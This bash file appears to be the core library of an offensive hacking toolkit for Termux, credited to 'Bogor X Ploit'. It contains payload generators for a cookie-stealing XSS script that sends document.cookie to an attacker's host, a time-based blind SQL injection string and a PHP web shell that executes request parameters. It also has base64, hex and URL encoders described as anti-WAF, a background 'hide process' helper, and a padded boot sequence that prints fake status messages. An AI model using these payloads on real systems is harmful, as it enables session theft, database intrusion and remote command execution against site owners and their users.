#!/usr/bin/env bash
# ============================================
#   BXP CORE LIBRARY v2.1 (Termux Fixed)
#   By Bogor X Ploit x Ijul v5.0
# ============================================

export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'

# --- 1. Network Engine ---
bxp_http_request() {
    local url="$1"; local payload="$2"
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/2.0"
    local response_time
    response_time=$(curl -s -A "$user_agent" --max-time 5 -o /dev/null -w "%{time_total}" "${url}${payload}" 2>/dev/null)
    if [ -z "$response_time" ] || [ "$response_time" = "0.000000" ]; then
        echo "TIMEOUT/ERROR"
    else
        echo "$response_time"
    fi
}

# --- 2. Encoder Engine (Anti WAF & Termux Fixed) ---
bxp_encode_b64() { echo -n "$1" | base64 | tr -d '\n'; }
bxp_encode_hex() {
    if command -v xxd >/dev/null 2>&1; then
        echo -n "$1" | xxd -p | tr -d '\n'
    else
        echo -n "$1" | od -An -tx1 | tr -d ' \n'
    fi
}
bxp_encode_url() { 
    echo -n "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$1"; 
}

# --- 3. Payload Engine (Generator) ---
bxp_gen_xss() { local host="$1" proto="${2:-http}"; echo "<script>new Image().src='${proto}://${host}:2010/?c='+encodeURIComponent(document.cookie);</script>"; }
bxp_gen_sqli() { [[ "$1" =~ ^[0-9]+$ ]] || return 1; echo "1' AND (SELECT 1 FROM (SELECT SLEEP($1))a)-- -"; }
bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }

# --- 4. System Engine ---
bxp_hide_process() {
    local cmd="$1"
    nohup bash -c "$cmd" >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

bxp_check_root() {
    if [ "$(id -u)" -eq 0 ]; then echo "Root"; else
        if command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then echo "Root (su available)"; else echo "Non-Root"; fi
    fi
}

# --- 5. BXP BOOT SEQUENCE ENGINE v3.2 ---
bxp_boot_sequence() {
    local TOOL_NAME="$1"
    local START_TIME=$(date +%s)
    local TARGET_DURATION=10
    local IS_ROOT=0
    
    if [ "$(id -u)" -eq 0 ]; then
        IS_ROOT=1
    elif command -v su >/dev/null 2>&1 && timeout 3 su -c id >/dev/null 2>&1; then
        IS_ROOT=1
    fi
    
    echo -e "  ${Y}[*] Synchronizing protocols preparing runtime...${N}"
    sleep 0.3
    echo -e "  ${G}[ OK ]${N} bash version: ${BASH_VERSION}"
    echo -e "  ${C}...${N}"
    
    if [ "$IS_ROOT" -eq 1 ]; then
        echo -e "  ${G}[ OK ]${N} Root privilege detected."
        sleep 0.8
        echo -e "  ${G}[ OK ]${N} Filesystem access granted."
        sleep 0.8
        echo -e "  ${G}[ OK ]${N} Loading cryptographic engine (openssl)..."
        sleep 0.8
        
        if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then
            echo -e "  ${G}[ OK ]${N} Proxy configuration detected: ${W}$http_proxy$https_proxy${N}"
        else
            echo -e "  ${Y}[*]${N} Proxy configuration ... [--] Not set (Direct Connection)"
        fi
        sleep 0.8
        
        echo -e "  ${G}[ OK ]${N} Preparing monitor mode ... SUPPORTED"
        sleep 0.8
        echo -e "  ${G}[ OK ]${N} Checking storage access ... /sdcard writable"
        sleep 0.8
        echo -e "  ${G}[ OK ]${N} Pinging 8.8.8.8 ... Network Connected"
        sleep 0.8
        echo -e "  ${G}[ OK ]${N} Loading core modules..."
        sleep 0.5
    else
        echo -e "  ${Y}[*] Preparing non-root fallback ...${N} ${G}[ OK ]${N}"
        sleep 0.3
        echo -e "  ${R}[--]${N} monitor mode: NOT SUPPORTED (non-root)"
        sleep 0.3
        echo -e "  ${R}[--]${N} packet injection: NOT SUPPORTED (non-root)"
        sleep 0.3
        echo -e "  ${R}[--]${N} GPU compute: NOT AVAILABLE (non-root)"
        sleep 0.3
        echo -e "  ${G}[ OK ]${N} CPU fallback: ACTIVE ($(uname -m) corefs)"
        sleep 0.3
        
        if command -v openssl >/dev/null 2>&1; then
            echo -e "  ${G}[ OK ]${N} Loading cryptographic engine (openssl)..."
        else
            echo -e "  ${Y}[*] Loading cryptographic engine ... [--] NOT FOUND (fallback bash)${N}"
        fi
        sleep 0.3
        
        if [ -n "$http_proxy" ] || [ -n "$https_proxy" ]; then
            echo -e "  ${G}[ OK ]${N} Proxy configuration detected: ${W}$http_proxy$https_proxy${N}"
        else
            echo -e "  ${Y}[*]${N} Proxy configuration ... [--] Not set (Direct Connection)"
        fi
        sleep 0.3
        
        if [ -d "/sdcard" ] && [ -r "/sdcard" ]; then
            echo -e "  ${Y}[*] Indexing wordlists .... [WARN] (directory empty)${N}"
        else
            echo -e "  ${R}[--]${N} /sdcard access denied. Run termux-setup-storage."
        fi
        sleep 0.3
        
        echo -e "  ${G}[ OK ]${N} Checking storage access ... /sdcard writable"
        sleep 0.3
        echo -e "  ${G}[ OK ]${N} Pinging 8.8.8.8 ... [ OK ] Network Connected"
        sleep 0.3
        echo -e "  ${G}[ OK ]${N} Calculating SHA1 checksum ... [ OK ] $(date +%s | sha1sum | cut -c1-16)..."
        sleep 0.3
        echo -e "  ${G}[ OK ]${N} Parsing module syntax ... [ OK ] Valid"
        sleep 0.3
        
        echo -e "  ${Y}[*] Initializing core modules...${N}"
        sleep 0.3
        echo -e "  ${G}[ OK ]${N} parser.sh loaded"
        sleep 0.2
        echo -e "  ${G}[ OK ]${N} crypto.sh loaded"
        sleep 0.2
        echo -e "  ${G}[ OK ]${N} ui.sh loaded"
        sleep 0.3
        
        echo -e "  ${Y}[*] Precomputing runtime constants...${N}"
        sleep 0.3
        echo -e "  ${Y}[*] Generating mask sets ..... [ OK ] (24 masks)${N}"
        sleep 0.3
        echo -e "  ${Y}[*] Loading common headers ... [ OK ]${N}"
        sleep 0.3
    fi
    
    local END_TIME=$(date +%s)
    local ELAPSED=$((END_TIME - START_TIME))
    local REMAINING=$((TARGET_DURATION - ELAPSED))
    
    if [ "$REMAINING" -gt 0 ]; then
        sleep "$REMAINING"
    fi
    
    echo -e "  ${G}[ SUCCESS ]${N} LAUNCHING ${W}${TOOL_NAME}${N}"
    sleep 0.5 
    echo -e "  ${G}[+] Module ready. (${TARGET_DURATION}s)${N}"
}

# --- 6. HEADER ASCII ENGINE (FONT ASLI TUAN) ---
bxp_ascii_title() {
    local title="$1"
    clear
    sleep 0.2
    
    case "$title" in
        "NYCTOPHOBIA")
            echo -e "${C}"
            cat <<'ASCII'
 _   _  __   __  ____  _____  ___   ____   _   _   ___   ____  ___   _    
| \ | | \ \ / / / ___||_   _|/ _ \ |  _ \ | | | | / _ \ | __ )|_ _| / \   
|  \| |  \ V / | |      | | | | | || |_) || |_| || | | ||  _ \ | | / _ \  
| |\  |   | |  | |___   | | | |_| ||  __/ |  _  || |_| || |_) || ||  _  | 
|_| \_|   |_|   \____|  |_|  \___/ |_|    |_| |_| \___/ |____/|___|_| |_| 
ASCII
            echo -e "${N}\n" ;;
        "SLEEP PARALYSIS")
            echo -e "${R}"
            cat <<'ASCII'
 ____  _      ____  ____  ____    ____    _    ____  _      __   __  ___  ____  
/ ___|| |    | ____|  _ \|  _ \  |  _ \  / \  |  _ \| |     \ \ / / / _ \|  _ \ 
\___ \| |    |  _| | |_) | |_) | | |_) |/ _ \ | |_) | |      \ V / | | | | |_) |
 ___) | |___ | |___|  __/|  __/  |  __// ___ \|  _ <| |___    | |  | |_| |  _ / 
|____/|_____||_____|_|   |_|     |_|  /_/   \_\_| \_\_____|   |_|   \___/|_| \_\
ASCII
            echo -e "${N}\n" ;;
        "NOCTURNAL DECAY")
            echo -e "${Y}"
            cat <<'ASCII'
 _   _  ____   ____  _____  _   _  ____    _     ____    ____   ____   _   __   __
| \ | |/ __ \ / ___||_   _|| | | ||  _ \  / \   |  _ \  |  _ \ / ___| / \  \ \ / /
|  \| | |  | | |      | |  | | | || |_) |/ _ \  | | | | | |_) | |    / _ \  \ V / 
| |\  | |__| | |___   | |  | |_| ||  _ <|  _  | | |_| | |  _ <| |___/ ___ \  | |  
|_| \_|\____/ \____|  |_|   \___/ |_| \_\_| |_| |____/  |_| \_\\____/_/   \_\ |_|  
ASCII
            echo -e "${N}\n" ;;
        "CYBER ATTACK")
            echo -e "${C}"
            cat <<'ASCII'
  ██████╗██╗   ██╗██████╗ ███████╗██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
ASCII
            echo -e "${N}\n" ;;
        "EXHUME DISGUISE")
            echo -e "${C}"
            cat <<'ASCII'
  _____  __  __  _   _  _   _  _____    ____  ___  ____  _   _  _____  _____ 
 | ____| \ \/ / | | | || | | || ____|  |  _ \|_ _|/ ___|| | | |/ ___|| ____|
 |  _|    \  /  | |_| || | | ||  _|    | | | || |\___ \| | | |\___ \|  _|  
 | |___   /  \  |  _  || |_| || |___   | |_| || | ___) | |_| | ___) | |___ 
 |_____| /_/\_\ |_| |_| \___/ |_____|  |____/|___|____/ \___/ |____/|_____|
ASCII
            echo -e "${N}\n" ;;
        "CHOKE THE HUNTERS")
            echo -e "${R}"
            cat <<'ASCII'
   ____  _   _  ___   ____  _  __ _____    _____  _   _  _____    _   _  _   _  _   _  _____  ____  ____   _____  ____  
  / ___|| | | |/ _ \ |  _ \| |/ /| ____|  |_   _|| | | ||  ___|  | | | || | | || \ | || ____||  _ \|  _ \ / ___||  _ \ 
 | |    | |_| | | | || |_) | ' / |  _|      | |  | |_| || |__    | |_| || |_| ||  \| ||  _|  | |_) | |_) |\___ \| |_) |
 | |___ |  _  | |_| ||  _ <| . \ | |___     | |  |  _  ||  __|   |  _  ||  _  || |\  || |___ |  _ <|  _ < ___) |  _ / 
  \____||_| |_|\___/ |_| \_\_|\_\|_____|    |_|  |_| |_||_|      |_| |_||_| |_||_| \_||_____||_| \_\_| \_\____/|_| \_\
ASCII
            echo -e "${N}\n" ;;
        "RECLAIM CATCH")
            echo -e "${G}"
            cat <<'ASCII'
  ____  _____  ____  _        _     ___  __  __    ____    _  _____  ____  _   _ 
 |  _ \| ____|/ ___|| |      / \   |_ _| \ \/ /   / ___|  / \|_   _|/ ___|| | | |
 | |_) |  _| | |    | |     / _ \   | |   \  /   | |     / _ \ | |  \___ \| |_| |
 |  _ <| |___| |___ | |___ / ___ \  | |   /  \   | |___ / ___ \| |   ___) |  _  |
 |_| \_\_____|\____||_____/_/   \_\|___| /_/\_\   \____/_/   \_\_|  |____/|_| |_|
ASCII
            echo -e "${N}\n" ;;
        "OUIJA MAGNIFYING")
            echo -e "${Y}"
            cat <<'ASCII'
   ___  _   _ ___ _  _    _      __  __    _    ____ _   _ _____ _____ _   _  ____  
  / _ \| | | |_ _| \| |  / \    |  \/  |  / \  / ___| | | |  ___|  ___| | | |/ ___| 
 | | | | | | || ||  ` | / _ \   | |\/| | / _ \| |  _| |_| | |_  | |_  | |_| | |  _  
 | |_| | |_| || || |\  |/ ___ \  | |  | |/ ___ \ |_| |  _  |  _| |  _| |  _  | |_| | 
  \___/ \___/|___|_| \_/_/   \_\ |_|  |_/_/   \_\____|_| |_|_|   |_|   |_| |_|\____| 
ASCII
            echo -e "${N}\n" ;;
        *)
            echo -e "${C}====================================================${N}"
            echo -e "${W}    ${title}${N}"
            echo -e "${C}====================================================${N}\n" ;;
    esac
    sleep 0.2
}
